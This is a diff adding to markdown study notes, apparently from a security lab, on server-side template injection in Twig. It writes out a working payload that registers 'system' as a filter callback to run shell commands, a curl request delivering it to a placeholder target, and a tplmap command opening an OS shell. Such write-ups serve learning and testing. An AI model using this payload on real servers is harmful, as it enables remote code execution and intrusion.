@@ -813,3 +813,24 @@ we can use `getFilter` to execute a user-defined function via:
 - register a function as a filter callback via `registerUndefinedFilterCallback`
 - invoke `_self.env.getFilter()` to execute the function we have just registered 
 
+so now our payload becomes: 
+
+```php
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
+```
+
+and we inject this into a curl command to the target: 
+
+`curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<target>:<port>`
+
+![](Images/Pasted%20image%2020240214104829.png)
+![](Images/Pasted%20image%2020240214104901.png)
+
+we could have also automated this with tplmap: 
+
+`./tplmap.py -u 'http://<target>:<port>' -d name=john --os-shell`
+
+![](Images/Pasted%20image%2020240214105227.png)
+
+one thing to note is that if we successfully evaluate the math expressions, then the app may also be vulnerable to XSS 
+
